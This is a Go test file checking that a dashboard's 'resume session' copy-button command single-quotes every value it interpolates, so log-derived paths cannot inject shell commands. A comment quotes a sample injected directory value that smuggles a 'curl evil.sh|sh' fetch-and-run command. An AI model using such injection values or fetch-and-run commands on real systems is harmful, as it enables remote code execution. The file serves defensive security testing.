package web

import (
	"encoding/json"
	"strings"
	"testing"
	"time"
)

// The resume command is a command line, not a string to display. It used to be
// assembled with double quotes:
//
//	'cd "' + cwd + '" && ' + agentCmd + ' --session "' + sessionPath + '"'
//
// A double-quoted argument ends at the first " inside it, so a working
// directory of
//
//	/x" ; curl evil.sh|sh ; "
//
// closed the cd argument and everything after it became a second command. The
// dashboard offers this string on a "Copy" button and documents it as the way
// to resume a session, which makes the dashboard itself the thing vouching for
// it. HTML escaping does nothing here — the two escapes are unrelated, and the
// value is not being rendered as markup here.
func TestJSResumeCommandIsQuotedForSh(t *testing.T) {
	script := readAsset(t, assets, "assets/dashboard.js")

	// The vulnerable construction, in any of the shapes it took.
	for _, old := range []string{
		`'cd "' + cwd + '"'`,
		`'cd "' + cwd + '" && `,
		`+" && claude --resume \""`,
		`+" && codex --resume \""`,
		`+" && agy --conversation \""`,
		`+ agentCmd + ' --session "'`,
	} {
		if strings.Contains(script, old) {
			t.Errorf("buildResumeCmd still builds a command with %q, "+
				"which a double quote in a log path terminates", old)
		}
	}

	// The replacement: single-quote each value, and escape the one character
	// that can end a single-quoted string.
	if !strings.Contains(script, "function shQuote(") {
		t.Fatal("buildResumeCmd has no sh quoting helper")
	}
	if !strings.Contains(script, `replace(/'/g, "'\\''")`) {
		t.Error("shQuote does not handle an embedded single quote, which is " +
			"the one character that ends the quoting it relies on")
	}
	if !strings.Contains(script, `"'" + String(value == null ? '' : value)`) {
		t.Error("shQuote does not wrap its value in single quotes")
	}
	// Every interpolated value has to go through it.
	for _, call := range []string{
		"shQuote(cwd)",
		"shQuote(sessionUid)",
		"shQuote(sessionPath)",
		"shQuote(agentCmd)",
	} {
		if !strings.Contains(script, call) {
			t.Errorf("buildResumeCmd does not quote %s", call)
		}
	}
}

// TestJSResumeCommandForOpenCodeNamesTheSessionId runs the shipped script.
//
// OpenCode is the one agent with no transcript file: every session is a row in
// one shared database, so the store has no path to give it and the session's
// path is empty. OpenCode's own CLI resumes by session id (`--session, -s`), so
// the command built from the path was `opencode --session ”` — a command that
// names no session, handed to the user by a button the dashboard vouches for.
func TestJSResumeCommandForOpenCodeNamesTheSessionId(t *testing.T) {
	const uid = "ses_01HQ8XYZ0000000000000001"
	var got string
	runDashboardJS(t,
		jsConfig{Ids: templateIDs(t), Data: sentinelPayload()},
		`async () => buildResumeCmd('opencode', '/home/testuser/project', '', `+quoteJS(uid)+`)`,
		&got)
	// The agent name is quoted too: it is a command position, and the script
	// quotes every value it interpolates.
	want := "cd '/home/testuser/project' && 'opencode' --session '" + uid + "'"
	if got != want {
		t.Errorf("resume command = %q, want %q; an OpenCode session has no path, so "+
			"the id is the only thing that can resume it", got, want)
	}

	// The other agents keep the value they had: a change here must not quietly
	// change what the Copy button produces for the five sources that worked.
	for _, tc := range []struct{ agent, want string }{
		{"claude", "cd '/w' && 'claude' --resume '" + uid + "'"},
		{"codex", "cd '/w' && 'codex' --resume '" + uid + "'"},
		{"agy", "cd '/w' && 'agy' --conversation '" + uid + "'"},
		{"pi", "cd '/w' && 'pi' --session '/logs/u1.jsonl'"},
	} {
		var out string
		runDashboardJS(t,
			jsConfig{Ids: templateIDs(t), Data: sentinelPayload()},
			`async () => buildResumeCmd(`+quoteJS(tc.agent)+`, '/w', '/logs/u1.jsonl', `+quoteJS(uid)+`)`,
			&out)
		if out != tc.want {
			t.Errorf("resume command for %s = %q, want %q", tc.agent, out, tc.want)
		}
	}
}

// quoteJS renders a Go string as a JavaScript string literal.
func quoteJS(s string) string {
	b, err := json.Marshal(s)
	if err != nil {
		panic(err)
	}
	return string(b)
}

// agentCmd is the one value buildResumeCmd takes that is not log-derived: it is
// the agent id, one of a fixed set the scanner assigns per source, so it is a
// constant rather than something an attacker chose. It is quoted anyway, because
// a command position is the wrong place to rely on that — but the claim is
// worth asserting, since it is why the resume command is a quoting problem and
// not a much larger one.
func TestAgentCommandInThePayloadIsTheStoredAgentNotALogField(t *testing.T) {
	srv, st := newTestServer(t)
	seed(t, st, time.Now())

	payload := dashboardPayload(t, get(t, srv, "/").Body.String())
	projects, ok := payload["projects"].([]any)
	if !ok || len(projects) == 0 {
		t.Fatal("no projects in the payload")
	}
	for _, p := range projects {
		pm := p.(map[string]any)
		cmd, _ := pm["agent_cmd"].(string)
		switch cmd {
		case "pi", "claude", "codex", "gemini", "agy", "opencode":
		default:
			t.Errorf("agent_cmd = %q, which is not one of the six known agents", cmd)
		}
	}
}
